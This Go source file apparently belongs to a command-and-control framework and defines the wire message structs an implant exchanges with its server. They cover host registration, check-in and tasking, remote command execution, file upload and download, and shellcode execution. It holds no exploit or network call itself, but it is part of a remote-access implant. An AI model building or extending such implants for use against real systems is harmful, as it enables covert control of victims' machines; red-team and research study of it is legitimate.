//Package containing functionality for communication between an implant and the server. This file contains all structures that are sent over the wire
//by the implant/server. These structs get serialized/deserialized with the JSON package.

package communication

// This map correlates all MessageType's to a specific data stucture for a message. This can be used for reflection so that no big switch
// statements have to be created. Note that MessageTypes and TaskTypes are the same.
var MessageTypeToStruct = map[int]func() interface{}{
	0: func() interface{} { return &ImplantRegister{} },
	1: func() interface{} { return &ImplantCheckinReq{} },
	2: func() interface{} { return &ImplantCheckinResp{} },
	4: func() interface{} { return &ImplantErrorResp{} },
	//...
	//reserved for implant functionality

	//modules start
	11: func() interface{} { return &FileInfoReq{} },
	12: func() interface{} { return &FileInfoResp{} },
	13: func() interface{} { return &LsReq{} },
	14: func() interface{} { return &LsResp{} },
	15: func() interface{} { return &ExecReq{} },
	16: func() interface{} { return &ExecResp{} },
	17: func() interface{} { return &CdReq{} },
	18: func() interface{} { return &CdResp{} },
	19: func() interface{} { return &DownloadReq{} },
	20: func() interface{} { return &DownloadResp{} },
	21: func() interface{} { return &UploadReq{} },
	22: func() interface{} { return &UploadResp{} },
	23: func() interface{} { return &ShellcodeExecReq{} },
	24: func() interface{} { return &ShellcodeExecResp{} },
}

// Used in CLI to map taskType to readable name
var MessageTypeToModuleName = map[int]string{
	11: "file info",
	13: "ls",
	15: "exec",
	17: "cd",
	19: "download",
	21: "upload",
	23: "shellcode exec",
}

// A task is a type of message that gets sent after checkin. Every task needs to have an ID so that we know to what task certain
// output belongs.
type Task interface {
	SetTaskId(id string) //This function is only used in the API. It's the API responsibility to generate tasks.
}

type ImplantRegister struct {
	ImplantId   string
	ImplantName string
	Hostname    string
	Username    string
	UID         string
	GID         string
}

type ImplantCheckinReq struct {
	ImplantId string
}

type ImplantCheckinResp struct {
	TaskTypes     []int
	TaskArguments [][]byte
}

type ImplantErrorResp struct {
	TaskId string
	Error  string
}

type FileInfoReq struct {
	TaskId     string
	PathToFile string
}

func (t *FileInfoReq) SetTaskId(id string) {
	t.TaskId = id
}

type FileInfoResp struct {
	TaskId  string
	Name    string
	Size    int64
	Mode    string
	ModTime int
	IsDir   bool
}

func (t *FileInfoResp) SetTaskId(id string) {
	t.TaskId = id
}

type LsReq struct {
	TaskId string
	Path   string
}

func (t *LsReq) SetTaskId(id string) {
	t.TaskId = id
}

type LsResp struct {
	TaskId string
	Result string
}

func (t *LsResp) SetTaskId(id string) {
	t.TaskId = id
}

type ExecReq struct {
	TaskId string
	Cmd    string
	Args   []string
}

func (t *ExecReq) SetTaskId(id string) {
	t.TaskId = id
}

type ExecResp struct {
	TaskId string
	Output []byte
}

func (t *ExecResp) SetTaskId(id string) {
	t.TaskId = id
}

type CdReq struct {
	TaskId string
	Path   string
}

func (t *CdReq) SetTaskId(id string) {
	t.TaskId = id
}

type CdResp struct {
	TaskId  string
	Success bool
}

func (t *CdResp) SetTaskId(id string) {
	t.TaskId = id
}

type DownloadReq struct {
	TaskId      string
	Origin      string
	Destination string
}

func (t *DownloadReq) SetTaskId(id string) {
	t.TaskId = id
}

type DownloadResp struct {
	TaskId   string
	Contents []byte
}

func (t *DownloadResp) SetTaskId(id string) {
	t.TaskId = id
}

type UploadReq struct {
	TaskId      string
	File        []byte
	Destination string
}

func (t *UploadReq) SetTaskId(id string) {
	t.TaskId = id
}

type UploadResp struct {
	TaskId  string
	Success bool
}

func (t *UploadResp) SetTaskId(id string) {
	t.TaskId = id
}

type ShellcodeExecReq struct {
	TaskId    string
	Shellcode string
}

func (t *ShellcodeExecReq) SetTaskId(id string) {
	t.TaskId = id
}

type ShellcodeExecResp struct {
	TaskId  string
	Success bool
}

func (t *ShellcodeExecResp) SetTaskId(id string) {
	t.TaskId = id
}
